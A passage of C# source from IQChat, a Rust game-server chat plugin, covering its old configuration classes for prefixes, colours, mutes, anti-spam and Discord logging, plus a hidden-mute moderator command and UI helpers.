                        foreach (Configuration.ControllerParameters.AdvancedFuncion NickColor in ControllerParameter.NickColorList.Where(color => color.Argument.Contains(KeyNickColor)).Take(1))
                        {
                            Info.Info.ColorNick = NickColor.Argument;
                            if (Sender != null)
                                ReplySystem(Sender, LanguageEn ? $"Message color successfully set to - {NickColor.Argument}" : $"Цвет сообщения успешно установлен на - {NickColor.Argument}");
                            else Puts(LanguageEn ? $"Message color successfully set to - {NickColor.Argument}" : $"Цвет сообщения успешно установлен на - {NickColor.Argument}");
                        }
                        break;
                    }
                case "custom":
                    {
                        String CustomPrefix = args.Args[2];
                        if (ControllerParameter.Prefixes.TurnMultiPrefixes)
                            Info.Info.PrefixList.Add(CustomPrefix);
                        else Info.Info.Prefix = CustomPrefix;
                        if (Sender != null)
                            ReplySystem(Sender, LanguageEn ? $"Custom prefix successfully set to - {CustomPrefix}" : $"Кастомный префикс успешно установлен на - {CustomPrefix}");
                        else Puts(LanguageEn ? $"Custom prefix successfully set to - {CustomPrefix}" : $"Кастомный префикс успешно установлен на - {CustomPrefix}");

                        break;
                    }
                default:
                    {
                        if (Sender != null)
                            ReplySystem(Sender, LanguageEn ? "Use syntax correctly : set [Steam64ID] [prefix/chat/nick/custom] [Argument]" : "Используйте правильно ситаксис : set [Steam64ID] [prefix/chat/nick/custom] [Argument]");
                        break;
                    }
            }

        }
        private class ConfigurationOld
        {
                        [JsonProperty(LanguageEn ? "Setting up player information" : "Настройка информации о игроке")]
            public ControllerConnection ControllerConnect = new ControllerConnection();
            internal class ControllerConnection
            {
                [JsonProperty(LanguageEn ? "Function switches" : "Перключатели функций")]
                public Turned Turneds = new Turned();
                [JsonProperty(LanguageEn ? "Setting Standard Values" : "Настройка стандартных значений")]
                public SetupDefault SetupDefaults = new SetupDefault();

                internal class SetupDefault
                {
                    [JsonProperty(LanguageEn ? "This prefix will be set if the player entered the server for the first time or in case of expiration of the rights to the prefix that he had earlier" : "Данный префикс установится если игрок впервые зашел на сервер или в случае окончания прав на префикс, который у него стоял ранее")]
                    public String PrefixDefault = "<color=#CC99FF>[ИГРОК]</color>";
                    [JsonProperty(LanguageEn ? "This nickname color will be set if the player entered the server for the first time or in case of expiration of the rights to the nickname color that he had earlier" : "Данный цвет ника установится если игрок впервые зашел на сервер или в случае окончания прав на цвет ника, который у него стоял ранее")]
                    public String NickDefault = "#33CCCC";
                    [JsonProperty(LanguageEn ? "This chat color will be set if the player entered the server for the first time or in case of expiration of the rights to the chat color that he had earlier" : "Данный цвет чата установится если игрок впервые зашел на сервер или в случае окончания прав на цвет чата, который у него стоял ранее")]
                    public String MessageDefault = "#0099FF";
                }
                internal class Turned
                {
                    [JsonProperty(LanguageEn ? "Set automatically a prefix to a player when he got the rights to it" : "Устанавливать автоматически префикс игроку, когда он получил права на него")]
                    public Boolean TurnAutoSetupPrefix;
                    [JsonProperty(LanguageEn ? "Set automatically the color of the nickname to the player when he got the rights to it" : "Устанавливать автоматически цвет ника игроку, когда он получил права на него")]
                    public Boolean TurnAutoSetupColorNick;
                    [JsonProperty(LanguageEn ? "Set the chat color automatically to the player when he got the rights to it" : "Устанавливать автоматически цвет чата игроку, когда он получил права на него")]
                    public Boolean TurnAutoSetupColorChat;
                    [JsonProperty(LanguageEn ? "Automatically reset the prefix when the player's rights to it expire" : "Сбрасывать автоматически префикс при окончании прав на него у игрока")]
                    public Boolean TurnAutoDropPrefix;
                    [JsonProperty(LanguageEn ? "Automatically reset the color of the nickname when the player's rights to it expire" : "Сбрасывать автоматически цвет ника при окончании прав на него у игрока")]
                    public Boolean TurnAutoDropColorNick;
                    [JsonProperty(LanguageEn ? "Automatically reset the color of the chat when the rights to it from the player expire" : "Сбрасывать автоматически цвет чата при окончании прав на него у игрока")]
                    public Boolean TurnAutoDropColorChat;
                }
            }
            
                        [JsonProperty(LanguageEn ? "Setting options for the player" : "Настройка параметров для игрока")]
            public ControllerParameters ControllerParameter = new ControllerParameters();
            internal class ControllerParameters
            {
                [JsonProperty(LanguageEn ? "Setting the display of options for player selection" : "Настройка отображения параметров для выбора игрока")]
                public VisualSettingParametres VisualParametres = new VisualSettingParametres();
                [JsonProperty(LanguageEn ? "List and customization of colors for a nickname" : "Список и настройка цветов для ника")]
                public List<AdvancedFuncion> NickColorList = new List<AdvancedFuncion>();
                [JsonProperty(LanguageEn ? "List and customize colors for chat messages" : "Список и настройка цветов для сообщений в чате")]
                public List<AdvancedFuncion> MessageColorList = new List<AdvancedFuncion>();
                [JsonProperty(LanguageEn ? "List and configuration of prefixes in chat" : "Список и настройка префиксов в чате")]
                public PrefixSetting Prefixes = new PrefixSetting();
                internal class PrefixSetting
                {
                    [JsonProperty(LanguageEn ? "Enable support for multiple prefixes at once (true - multiple prefixes can be set/false - only 1 can be set to choose from)" : "Включить поддержку нескольких префиксов сразу (true - можно установить несколько префиксов/false - установить можно только 1 на выбор)")]
                    public Boolean TurnMultiPrefixes;
                    [JsonProperty(LanguageEn ? "The maximum number of prefixes that can be set at a time (This option only works if setting multiple prefixes is enabled)" : "Максимальное количество префиксов, которое можно установить за раз(Данный параметр работает только если включена установка нескольких префиксов)")]
                    public Int32 MaximumMultiPrefixCount;
                    [JsonProperty(LanguageEn ? "List of prefixes and their settings" : "Список префиксов и их настройка")]
                    public List<AdvancedFuncion> Prefixes = new List<AdvancedFuncion>();
                }

                internal class AdvancedFuncion
                {
                    [JsonProperty(LanguageEn ? "Permission" : "Права")]
                    public String Permissions;
                    [JsonProperty(LanguageEn ? "Argument" : "Значение")]
                    public String Argument;
                }

                internal class VisualSettingParametres
                {
                    [JsonProperty(LanguageEn ? "Player prefix selection display type - (0 - dropdown list, 1 - slider (Please note that if you have multi-prefix enabled, the dropdown list will be set))" : "Тип отображения выбора префикса для игрока - (0 - выпадающий список, 1 - слайдер (Учтите, что если у вас включен мульти-префикс, будет установлен выпадающий список))")]
                    public SelectedParametres PrefixType;
                    [JsonProperty(LanguageEn ? "Display type of player's nickname color selection - (0 - drop-down list, 1 - slider)" : "Тип отображения выбора цвета ника для игрока - (0 - выпадающий список, 1 - слайдер)")]
                    public SelectedParametres NickColorType;
                    [JsonProperty(LanguageEn ? "Display type of message color choice for the player - (0 - drop-down list, 1 - slider)" : "Тип отображения выбора цвета сообщения для игрока - (0 - выпадающий список, 1 - слайдер)")]
                    public SelectedParametres ChatColorType;
                    [JsonProperty(LanguageEn ? "IQRankSystem : Player rank selection display type - (0 - drop-down list, 1 - slider)" : "IQRankSystem : Тип отображения выбора ранга для игрока - (0 - выпадающий список, 1 - слайдер)")]
                    public SelectedParametres IQRankSystemType;
                }
            }
            
                        [JsonProperty(LanguageEn ? "Plugin mute settings" : "Настройка мута в плагине")]
            public ControllerMute ControllerMutes = new ControllerMute();
            internal class ControllerMute
            {
                [JsonProperty(LanguageEn ? "Setting up automatic muting" : "Настройка автоматического мута")]
                public AutoMute AutoMuteSettings = new AutoMute();
                internal class AutoMute
                {
                    [JsonProperty(LanguageEn ? "Enable automatic muting for forbidden words (true - yes/false - no)" : "Включить автоматический мут по запрещенным словам(true - да/false - нет)")]
                    public Boolean UseAutoMute;
                    [JsonProperty(LanguageEn ? "Reason for automatic muting" : "Причина автоматического мута")]
                    public Muted AutoMuted;
                }
                [JsonProperty(LanguageEn ? "Additional setting for logging about mutes in discord" : "Дополнительная настройка для логирования о мутах в дискорд")]
                public LoggedFuncion LoggedMute = new LoggedFuncion();
                internal class LoggedFuncion
                {
                    [JsonProperty(LanguageEn ? "Support for logging the last N messages (Discord logging about mutes must be enabled)" : "Поддержка логирования последних N сообщений (Должно быть включено логирование в дискорд о мутах)")]
                    public Boolean UseHistoryMessage;
                    [JsonProperty(LanguageEn ? "How many latest player messages to send in logging" : "Сколько последних сообщений игрока отправлять в логировании")]
                    public Int32 CountHistoryMessage;
                }

                [JsonProperty(LanguageEn ? "Reasons to block chat" : "Причины для блокировки чата")]
                public List<Muted> MuteChatReasons = new List<Muted>();
                [JsonProperty(LanguageEn ? "Reasons to block your voice" : "Причины для блокировки голоса")]
                public List<Muted> MuteVoiceReasons = new List<Muted>();
                internal class Muted
                {
                    [JsonProperty(LanguageEn ? "Reason for blocking" : "Причина для блокировки")]
                    public String Reason;
                    [JsonProperty(LanguageEn ? "Block time (in seconds)" : "Время блокировки(в секундах)")]
                    public Int32 SecondMute;
                }
            }
            
                        [JsonProperty(LanguageEn ? "Configuring Message Processing" : "Настройка обработки сообщений")]
            public ControllerMessage ControllerMessages = new ControllerMessage();
            internal class ControllerMessage
            {
                [JsonProperty(LanguageEn ? "Basic settings for chat messages from the plugin" : "Основная настройка сообщений в чат от плагина")]
                public GeneralSettings GeneralSetting = new GeneralSettings();    
                [JsonProperty(LanguageEn ? "Configuring functionality switching in chat" : "Настройка переключения функционала в чате")]
                public TurnedFuncional TurnedFunc = new TurnedFuncional();        
                [JsonProperty(LanguageEn ? "Player message formatting settings" : "Настройка форматирования сообщений игроков")]
                public FormattingMessage Formatting = new FormattingMessage();

                internal class GeneralSettings
                {
                    [JsonProperty(LanguageEn ? "Customizing the chat alert format" : "Настройка формата оповещения в чате")]
                    public BroadcastSettings BroadcastFormat = new BroadcastSettings();
                    [JsonProperty(LanguageEn ? "Setting the mention format in the chat, via @" : "Настройка формата упоминания в чате, через @")]
                    public AlertSettings AlertFormat = new AlertSettings();      
                    [JsonProperty(LanguageEn ? "Additional setting" : "Дополнительная настройка")]
                    public OtherSettings OtherSetting = new OtherSettings();

                    internal class BroadcastSettings
                    {
                        [JsonProperty(LanguageEn ? "The name of the notification in the chat" : "Наименование оповещения в чат")]
                        public String BroadcastTitle;
                        [JsonProperty(LanguageEn ? "Chat alert message color" : "Цвет сообщения оповещения в чат")]
                        public String BroadcastColor;
                        [JsonProperty(LanguageEn ? "Steam64ID for chat avatar" : "Steam64ID для аватарки в чате")]
                        public String Steam64IDAvatar;
                    }
                    internal class AlertSettings
                    {
                        [JsonProperty(LanguageEn ? "The color of the player mention message in the chat" : "Цвет сообщения упоминания игрока в чате")]
                        public String AlertPlayerColor;
                        [JsonProperty(LanguageEn ? "Sound when receiving and sending a mention via @" : "Звук при при получении и отправки упоминания через @")]
                        public String SoundAlertPlayer;
                    }
                    internal class OtherSettings
                    {
                        [JsonProperty(LanguageEn ? "Time after which the message will be deleted from the UI from the administrator" : "Время,через которое удалится сообщение с UI от администратора")]
                        public Int32 TimeDeleteAlertUI;

                        [JsonProperty(LanguageEn ? "The size of the message from the player in the chat" : "Размер сообщения от игрока в чате")]
                        public Int32 SizeMessage = 14;
                        [JsonProperty(LanguageEn ? "Player nickname size in chat" : "Размер ника игрока в чате")]
                        public Int32 SizeNick = 14;
                        [JsonProperty(LanguageEn ? "The size of the player's prefix in the chat (will be used if <size=N></size> is not set in the prefix itself)" : "Размер префикса игрока в чате (будет использовано, если в самом префиксе не установвлен <size=N></size>)")]
                        public Int32 SizePrefix = 14;
                    }
                }
                internal class TurnedFuncional
                {
                    [JsonProperty(LanguageEn ? "Configuring spam protection" : "Настройка защиты от спама")]
                    public AntiSpam AntiSpamSetting = new AntiSpam();
                    [JsonProperty(LanguageEn ? "Setting up a temporary chat block for newbies (who have just logged into the server)" : "Настройка временной блокировки чата новичкам (которые только зашли на сервер)")]
                    public AntiNoob AntiNoobSetting = new AntiNoob();
                    [JsonProperty(LanguageEn ? "Setting up private messages" : "Настройка личных сообщений")]
                    public PM PMSetting = new PM();

                    internal class AntiNoob
                    {
                        [JsonProperty(LanguageEn ? "Newbie protection in PM/R" : "Защита от новичка в PM/R")]
                        public Settings AntiNoobPM = new Settings();
                        [JsonProperty(LanguageEn ? "Newbie protection in global and team chat" : "Защита от новичка в глобальном и коммандном чате")]
                        public Settings AntiNoobChat = new Settings();
                        internal class Settings
                        {
                            [JsonProperty(LanguageEn ? "Enable protection?" : "Включить защиту?")]
                            public Boolean AntiNoobActivate = false;
                            [JsonProperty(LanguageEn ? "Newbie Chat Lock Time" : "Время блокировки чата для новичка")]
                            public Int32 TimeBlocked = 1200;
                        }
                    }
                    internal class AntiSpam
                    {
                        [JsonProperty(LanguageEn ? "Enable spam protection (Anti-spam)" : "Включить защиту от спама (Анти-спам)")]
                        public Boolean AntiSpamActivate;
                        [JsonProperty(LanguageEn ? "Time after which a player can send a message (AntiSpam)" : "Время через которое игрок может отправлять сообщение (АнтиСпам)")]
                        public Int32 FloodTime;
                        [JsonProperty(LanguageEn ? "Additional Anti-Spam settings" : "Дополнительная настройка Анти-Спама")]
                        public AntiSpamDuples AntiSpamDuplesSetting = new AntiSpamDuples();
                        internal class AntiSpamDuples
                        {
                            [JsonProperty(LanguageEn ? "Enable additional spam protection (Anti-duplicates, duplicate messages)" : "Включить дополнительную защиту от спама (Анти-дубликаты, повторяющие сообщения)")]
                            public Boolean AntiSpamDuplesActivate = true;
                            [JsonProperty(LanguageEn ? "How many duplicate messages does a player need to make to be confused by the system" : "Сколько дублирующих сообщений нужно сделать игроку чтобы его замутила система")]
                            public Int32 TryDuples = 3;
                            [JsonProperty(LanguageEn ? "Setting up automatic muting for duplicates" : "Настройка автоматического мута за дубликаты")]
                            public ControllerMute.Muted MuteSetting = new ControllerMute.Muted
                            {
                                Reason = LanguageEn ? "Blocking for duplicate messages (SPAM)" : "Блокировка за дублирующие сообщения (СПАМ)",
                                SecondMute = 300,
                            };
                        }
                    }
                    internal class PM
                    {
                        [JsonProperty(LanguageEn ? "Enable Private Messages" : "Включить личные сообщения")]
                        public Boolean PMActivate;
                        [JsonProperty(LanguageEn ? "Sound when receiving a private message" : "Звук при при получении личного сообщения")]
                        public String SoundPM;
                    }
                    [JsonProperty(LanguageEn ? "Enable PM ignore for players (/ignore nick or via interface)" : "Включить игнор ЛС игрокам(/ignore nick или через интерфейс)")]
                    public Boolean IgnoreUsePM;
                    [JsonProperty(LanguageEn ? "Hide the issue of items to the Admin from the chat" : "Скрыть из чата выдачу предметов Админу")]
                    public Boolean HideAdminGave;
                    [JsonProperty(LanguageEn ? "Move mute to team chat (In case of a mute, the player will not be able to write even to the team chat)" : "Переносить мут в командный чат(В случае мута, игрок не сможет писать даже в командный чат)")]
                    public Boolean MuteTeamChat;
                }
                internal class FormattingMessage
                {
                    [JsonProperty(LanguageEn ? "Enable message formatting [Will control caps, message format] (true - yes/false - no)" : "Включить форматирование сообщений [Будет контроллировать капс, формат сообщения] (true - да/false - нет)")]
                    public Boolean FormatMessage;
                    [JsonProperty(LanguageEn ? "Use a list of banned words (true - yes/false - no)" : "Использовать список запрещенных слов (true - да/false - нет)")]
                    public Boolean UseBadWords;
                    [JsonProperty(LanguageEn ? "The word that will replace the forbidden word" : "Слово которое будет заменять запрещенное слово")]
                    public String ReplaceBadWord;
                    [JsonProperty(LanguageEn ? "List of banned words" : "Список запрещенных слов")]
                    public List<String> BadWords = new List<String>();

                    [JsonProperty(LanguageEn ? "Nickname controller setup" : "Настройка контроллера ников")]
                    public NickController ControllerNickname = new NickController();
                    internal class NickController
                    {
                        [JsonProperty(LanguageEn ? "Enable player nickname formatting (message formatting must be enabled)" : "Включить форматирование ников игроков (должно быть включено форматирование сообщений)")]
                        public Boolean UseNickController = true;
                        [JsonProperty(LanguageEn ? "The word that will replace the forbidden word (You can leave it blank and it will just delete)" : "Слово которое будет заменять запрещенное слово (Вы можете оставить пустым и будет просто удалять)")]
                        public String ReplaceBadNick = "****";
                        [JsonProperty(LanguageEn ? "List of banned nicknames" : "Список запрещенных ников")]
                        public List<String> BadNicks = new List<String>();
                    }
                }
            }

            
            
            [JsonProperty(LanguageEn ? "Setting up chat alerts" : "Настройка оповещений в чате")]
            public ControllerAlert ControllerAlertSetting;

            internal class ControllerAlert
            {
                [JsonProperty(LanguageEn ? "Setting up chat alerts" : "Настройка оповещений в чате")]
                public Alert AlertSetting;
                [JsonProperty(LanguageEn ? "Setting notifications about the status of the player's session" : "Настройка оповещений о статусе сессии игрока")]
                public PlayerSession PlayerSessionSetting;
                [JsonProperty(LanguageEn ? "Configuring administrator session status alerts" : "Настройка оповещений о статусе сессии администратора")]
                public AdminSession AdminSessionSetting;
                [JsonProperty(LanguageEn ? "Setting up personal notifications to the player when connecting" : "Настройка персональных оповоещений игроку при коннекте")]
                public PersonalAlert PersonalAlertSetting;
                internal class Alert
                {
                    [JsonProperty(LanguageEn ? "Enable automatic messages in chat (true - yes/false - no)" : "Включить автоматические сообщения в чат (true - да/false - нет)")]
                    public Boolean AlertMessage;
                    [JsonProperty(LanguageEn ? "Type of automatic messages : true - sequential / false - random" : "Тип автоматических сообщений : true - поочередные/false - случайные")]
                    public Boolean AlertMessageType;

                    [JsonProperty(LanguageEn ? "List of automatic messages in chat" : "Список автоматических сообщений в чат")]
                    public List<String> MessageList;
                    [JsonProperty(LanguageEn ? "Interval for sending messages to chat (Broadcaster) (in seconds)" : "Интервал отправки сообщений в чат (Броадкастер) (в секундах)")]
                    public Int32 MessageListTimer;
                }
                internal class PlayerSession
                {
                    [JsonProperty(LanguageEn ? "When a player is notified about the entry / exit of the player, display his avatar opposite the nickname (true - yes / false - no)" : "При уведомлении о входе/выходе игрока отображать его аватар напротив ника (true - да/false - нет)")]
                    public Boolean ConnectedAvatarUse;

                    [JsonProperty(LanguageEn ? "Notify in chat when a player enters (true - yes/false - no)" : "Уведомлять в чате о входе игрока (true - да/false - нет)")]
                    public Boolean ConnectedAlert;
                    [JsonProperty(LanguageEn ? "Enable random notifications when a player from the list enters (true - yes / false - no)" : "Включить случайные уведомления о входе игрока из списка (true - да/false - нет)")]
                    public Boolean ConnectionAlertRandom;
                    [JsonProperty(LanguageEn ? "Show the country of the entered player (true - yes/false - no)" : "Отображать страну зашедшего игрока (true - да/false - нет")]
                    public Boolean ConnectedWorld;

                    [JsonProperty(LanguageEn ? "Notify when a player enters the chat (selected from the list) (true - yes/false - no)" : "Уведомлять о выходе игрока в чат(выбираются из списка) (true - да/false - нет)")]
                    public Boolean DisconnectedAlert;
                    [JsonProperty(LanguageEn ? "Enable random player exit notifications (true - yes/false - no)" : "Включить случайные уведомления о выходе игрока (true - да/false - нет)")]
                    public Boolean DisconnectedAlertRandom;
                    [JsonProperty(LanguageEn ? "Display reason for player exit (true - yes/false - no)" : "Отображать причину выхода игрока (true - да/false - нет)")]
                    public Boolean DisconnectedReason;

                    [JsonProperty(LanguageEn ? "Random player entry notifications({0} - player's nickname, {1} - country (if country display is enabled)" : "Случайные уведомления о входе игрока({0} - ник игрока, {1} - страна(если включено отображение страны)")]
                    public List<String> RandomConnectionAlert = new List<String>();
                    [JsonProperty(LanguageEn ? "Random notifications about the exit of the player ({0} - player's nickname, {1} - the reason for the exit (if the reason is enabled)" : "Случайные уведомления о выходе игрока({0} - ник игрока, {1} - причина выхода(если включена причина)")]
                    public List<String> RandomDisconnectedAlert = new List<String>();
                }
                internal class AdminSession
                {
                    [JsonProperty(LanguageEn ? "Notify admin on the server in the chat (true - yes/false - no)" : "Уведомлять о входе админа на сервер в чат (true - да/false - нет)")]
                    public Boolean ConnectedAlertAdmin;
                    [JsonProperty(LanguageEn ? "Notify about admin leaving the server in chat (true - yes/false - no)" : "Уведомлять о выходе админа на сервер в чат (true - да/false - нет)")]
                    public Boolean DisconnectedAlertAdmin;
                }
                internal class PersonalAlert
                {
                    [JsonProperty(LanguageEn ? "Enable random message to the player who has logged in (true - yes/false - no)" : "Включить случайное сообщение зашедшему игроку (true - да/false - нет)")]
                    public Boolean UseWelcomeMessage;
                    [JsonProperty(LanguageEn ? "List of messages to the player when entering" : "Список сообщений игроку при входе")]
                    public List<String> WelcomeMessage = new List<String>();
                }
            }

            
                        [JsonProperty(LanguageEn ? "Settings Rust+" : "Настройка Rust+")]
            public RustPlus RustPlusSettings;
            internal class RustPlus
            {
                [JsonProperty(LanguageEn ? "Use Rust+" : "Использовать Rust+")]
                public Boolean UseRustPlus;
                [JsonProperty(LanguageEn ? "Title for notification Rust+" : "Название для уведомления Rust+")]
                public String DisplayNameAlert;
            }
            
                        [JsonProperty(LanguageEn ? "Configuring support plugins" : "Настройка плагинов поддержки")]
            public ReferenceSettings ReferenceSetting = new ReferenceSettings();
            internal class ReferenceSettings
            {
                [JsonProperty(LanguageEn ? "Settings IQFakeActive" : "Настройка IQFakeActive")]
                public IQFakeActive IQFakeActiveSettings = new IQFakeActive();
                [JsonProperty(LanguageEn ? "Settings IQRankSystem" : "Настройка IQRankSystem")]
                public IQRankSystem IQRankSystems = new IQRankSystem();
                internal class IQRankSystem
                {
                    [JsonProperty(LanguageEn ? "Rank display format in chat ( {0} is the user's rank, do not delete this value)" : "Формат отображения ранга в чате ( {0} - это ранг юзера, не удаляйте это значение)")]
                    public String FormatRank = "[{0}]";
                    [JsonProperty(LanguageEn ? "Time display format with IQRank System in chat ( {0} is the user's time, do not delete this value)" : "Формат отображения времени с IQRankSystem в чате ( {0} - это время юзера, не удаляйте это значение)")]
                    public String FormatRankTime = "[{0}]";
                    [JsonProperty(LanguageEn ? "Use support IQRankSystem" : "Использовать поддержку рангов")]
                    public Boolean UseRankSystem;
                    [JsonProperty(LanguageEn ? "Show players their played time next to their rank" : "Отображать игрокам их отыгранное время рядом с рангом")]
                    public Boolean UseTimeStandart;
                }
                internal class IQFakeActive
                {
                    [JsonProperty(LanguageEn ? "Use support IQFakeActive" : "Использовать поддержку IQFakeActive")]
                    public Boolean UseIQFakeActive;
                }
            }
            
            
            [JsonProperty(LanguageEn ? "Setting up an answering machine" : "Настройка автоответчика")]
            public AnswerMessage AnswerMessages = new AnswerMessage();

            internal class AnswerMessage
            {
                [JsonProperty(LanguageEn ? "Enable auto-reply? (true - yes/false - no)" : "Включить автоответчик?(true - да/false - нет)")]
                public bool UseAnswer;
                [JsonProperty(LanguageEn ? "Customize Messages [Keyword] = Reply" : "Настройка сообщений [Ключевое слово] = Ответ")]
                public Dictionary<String, String> AnswerMessageList = new Dictionary<String, String>();
            }

            
                        [JsonProperty(LanguageEn ? "Additional setting" : "Дополнительная настройка")]
            public OtherSettings OtherSetting;
            
            internal class OtherSettings
            {
                [JsonProperty(LanguageEn ? "Setting up message logging" : "Настройка логирования сообщений")]
                public LoggedChat LogsChat = new LoggedChat();
                [JsonProperty(LanguageEn ? "Setting up logging of personal messages of players" : "Настройка логирования личных сообщений игроков")]
                public General LogsPMChat = new General();   
                [JsonProperty(LanguageEn ? "Setting up chat/voice lock/unlock logging" : "Настройка логирования блокировок/разблокировок чата/голоса")]
                public General LogsMuted = new General();
                [JsonProperty(LanguageEn ? "Setting up logging of chat commands from players" : "Настройка логирования чат-команд от игроков")]
                public General LogsChatCommands = new General();
                internal class LoggedChat
                {
                    [JsonProperty(LanguageEn ? "Setting up general chat logging" : "Настройка логирования общего чата")]
                    public General GlobalChatSettings = new General();     
                    [JsonProperty(LanguageEn ? "Setting up team chat logging" : "Настройка логирования тим чата")]
                    public General TeamChatSettings = new General();
                }
                internal class General
                {
                    [JsonProperty(LanguageEn ? "Enable logging (true - yes/false - no)" : "Включить логирование (true - да/false - нет)")]
                    public Boolean UseLogged = false;
                    [JsonProperty(LanguageEn ? "Webhooks channel for logging" : "Webhooks канала для логирования")]
                    public String Webhooks = "";
                }
            }
                    }
        public string GetLang(string LangKey, string userID = null, params object[] args)
        {
            sb.Clear();
            if (args != null)
            {
                sb.AppendFormat(lang.GetMessage(LangKey, this, userID), args);
                return sb.ToString();
            }
            return lang.GetMessage(LangKey, this, userID);
        }
        
                
                private String GetImage(String fileName, UInt64 skin = 0)
        {
            var imageId = (String)plugins.Find("ImageLibrary").CallHook("ImageUi.GetImage", fileName, skin);
            if (!string.IsNullOrEmpty(imageId))
                return imageId;
            return String.Empty;
        }

        
                private void DrawUI_IQChat_DropList(BasePlayer player, String OffsetMin, String OffsetMax, String Title, TakeElementUser ElementType)
        {
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_DropList");
            if (Interface == null) return;

            Interface = Interface.Replace("%TITLE%", Title);
            Interface = Interface.Replace("%OFFSET_MIN%", OffsetMin);
            Interface = Interface.Replace("%OFFSET_MAX%", OffsetMax);
            Interface = Interface.Replace("%BUTTON_DROP_LIST_CMD%", $"newui.cmd droplist.controller open {ElementType}");

            CuiHelper.AddUi(player, Interface);
        }

        [ChatCommand("hmute")]
        void HideMute(BasePlayer Moderator, string cmd, string[] arg)
        {
            if (!permission.UserHasPermission(Moderator.UserIDString, PermissionMute)) return;
            if (arg == null || arg.Length != 3 || arg.Length > 3)
            {
                ReplySystem(Moderator, LanguageEn ? "Invalid syntax, use : hmute Steam64ID/Nick Reason Time(seconds)" : "Неверный синтаксис,используйте : hmute Steam64ID/Ник Причина Время(секунды)");
                return;
            }
            string NameOrID = arg[0];
            string Reason = arg[1];
            Int32 TimeMute = 0;
            if (!Int32.TryParse(arg[2], out TimeMute))
            {
                ReplySystem(Moderator, LanguageEn ? "Enter the time in numbers!" : "Введите время цифрами!");
                return;
            }
            BasePlayer target = GetPlayerNickOrID(NameOrID);
            if (target == null)
            {
                UInt64 Steam64ID = 0;
                if (UInt64.TryParse(NameOrID, out Steam64ID))
                {
                    if(UserInformation.ContainsKey(Steam64ID))
                    {
                        User Info = UserInformation[Steam64ID];
                        if (Info == null) return;
                        if (Info.MuteInfo.IsMute(MuteType.Chat))
                        {
                            ReplySystem(Moderator, LanguageEn ? "The player already has a chat lock" : "Игрок уже имеет блокировку чата");
                            return;
                        }
                        
                        Info.MuteInfo.SetMute(MuteType.Chat, TimeMute);
                        ReplySystem(Moderator,LanguageEn ? "Chat blocking issued to offline player" : "Блокировка чата выдана offline-игроку");
                        return;
                    }
                    else
                    {
                        ReplySystem(Moderator,LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                        return;
                    }
                }
                else
                {
                    ReplySystem(Moderator,LanguageEn ? "This player is not on the server" : "Такого игрока нет на сервере");
                    return;
                }
            }

            MutePlayer(target, MuteType.Chat, 0, Moderator, Reason, TimeMute, true, true);
        }
        void WriteData()
        {
            Oxide.Core.Interface.Oxide.DataFileSystem.WriteObject("IQSystem/IQChat/Information", GeneralInfo);
            Oxide.Core.Interface.Oxide.DataFileSystem.WriteObject("IQSystem/IQChat/Users", UserInformation);
            Oxide.Core.Interface.Oxide.DataFileSystem.WriteObject("IQSystem/IQChat/AntiNoob", UserInformationConnection);
        }

        private String GetReferenceTags(BasePlayer player)
        {
            String Result = String.Empty;
            String Rank = String.Empty;
            String RankTime = String.Empty;
            if (IQRankSystem)
            {
                Configuration.ReferenceSettings.IQRankSystem IQRank = config.ReferenceSetting.IQRankSystems;

                if (IQRank.UseRankSystem)
                {
                    if (IQRank.UseTimeStandart)
                        RankTime = String.IsNullOrWhiteSpace(IQRankGetTimeGame(player.userID)) ? String.Empty : String.Format(IQRank.FormatRank, IQRankGetTimeGame(player.userID));
                    Rank = String.IsNullOrWhiteSpace(IQRankGetRank(player.userID)) ? String.Empty : String.Format(IQRank.FormatRank, IQRankGetRank(player.userID));

                    if (!String.IsNullOrWhiteSpace(RankTime))
                        Result += $"{RankTime} ";
                    if (!String.IsNullOrWhiteSpace(Rank))
                        Result += $"{Rank} ";
                }
            }

            String XLevel = XLevel_GetLevel(player);
            if (!String.IsNullOrWhiteSpace(XLevel))
                Result += $"{XLevel} ";
            
            return Result;
        }
        private void DrawUI_IQChat_OpenDropListArgument(BasePlayer player, Int32 Count)
        {
            String Interface = InterfaceBuilder.GetInterface("UI_Chat_OpenDropListArgument_Taked");
            if (Interface == null) return;
           
            Interface = Interface.Replace("%COUNT%", Count.ToString());

            CuiHelper.DestroyUi(player, $"TAKED_INFO_{Count}");
            CuiHelper.AddUi(player, Interface);
        }      
        internal class AntiNoob
        {
            public DateTime DateConnection = DateTime.UtcNow;

            public Boolean IsNoob(Int32 TimeBlocked)
            {
                System.TimeSpan Time = DateTime.UtcNow.Subtract(DateConnection);
                return Time.TotalSeconds < TimeBlocked;
            }

            public Double LeftTime(Int32 TimeBlocked)
            {
                System.TimeSpan Time = DateTime.UtcNow.Subtract(DateConnection);

                return (TimeBlocked - Time.TotalSeconds);
            }
        }

        
                public Boolean IsNoob(UInt64 userID, Int32 TimeBlocked)
        {
            if (UserInformationConnection.ContainsKey(userID))
                return UserInformationConnection[userID].IsNoob(TimeBlocked);
            return false;
        }
        
        
        private void ControlledBadNick(IPlayer player)
        {
            if (player == null) return;
            Configuration.ControllerMessage ControllerMessage = config.ControllerMessages;

            String DisplayName = player.Name;

            Tuple<String, Boolean> GetTupleNick = BadWordsCleaner(DisplayName,
                ControllerMessage.Formatting.ControllerNickname.ReplaceBadNick,
                ControllerMessage.Formatting.ControllerNickname.BadNicks);
            DisplayName = GetTupleNick.Item1;

            DisplayName = RemoveLinkText(DisplayName);
            player.Rename(DisplayName);
        }
        void Unload()
        {
            InterfaceBuilder.DestroyAll();

            WriteData();
            _ = null;
        }
        private enum TakeElementUser
        {
            Prefix,
            Nick,
            Chat,
            Rank,
            MultiPrefix
        }

        
                public GeneralInformation GeneralInfo = new GeneralInformation();
        public Dictionary<BasePlayer, List<String>> LastMessagesChat = new Dictionary<BasePlayer, List<String>>();
        
        
        
        
        public List<String> GetMesagesList(BasePlayer player, Dictionary<String, List<String>> LanguageMessages)
        {
            String LangPlayer = _.lang.GetLanguage(player.UserIDString);

            if (LanguageMessages.ContainsKey(LangPlayer))
                return LanguageMessages[LangPlayer];
            else if (LanguageMessages.ContainsKey("en"))
                return LanguageMessages["en"];
            else return LanguageMessages.FirstOrDefault().Value;
        }
		   		 		  						  	   		  	  			  	  			  	   		  		  
        
        
                private const Boolean LanguageEn = false;

        private void RemoveParametres(String ID, String Permissions)
        {
            UInt64 UserID = UInt64.Parse(ID);
            BasePlayer player = BasePlayer.FindByID(UserID);

            Configuration.ControllerConnection Controller = config.ControllerConnect;
